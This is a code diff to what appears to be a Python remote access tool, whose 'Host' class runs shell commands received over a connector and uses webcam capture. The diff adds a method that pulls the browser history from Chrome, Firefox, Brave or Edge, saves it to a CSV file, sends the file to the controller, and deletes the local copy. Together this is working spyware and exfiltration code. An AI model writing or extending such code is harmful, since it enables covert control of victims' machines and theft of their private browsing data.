@@ -4,6 +4,8 @@ from os import remove
 from cv2 import VideoCapture, imencode, CAP_DSHOW
 from subprocess import Popen, PIPE
 from socket import gethostbyname
+from browser_history import browsers
+
 
 class Host:
 
@@ -51,3 +53,18 @@ class Host:
         process = Popen(command, shell=True, stdout=PIPE, stderr=PIPE, stdin=PIPE)
         out, err = process.communicate()
         self.__connector.send_bytes(out, err)
+
+    def send_browser_historial(self, browser:str):
+        if browser == "chrome":
+            browserr = browsers.Chrome()
+        elif browser == "firefox":
+            browserr = browsers.Firefox()
+        elif browser == "brave":
+            browserr = browsers.Brave()
+        else:
+            browserr = browsers.Edge()
+        fetch = browserr.fetch_history()
+        fetch.save("historial.csv")
+        
+        self.__connector.send_file("historial.csv")
+        remove("historial.csv")
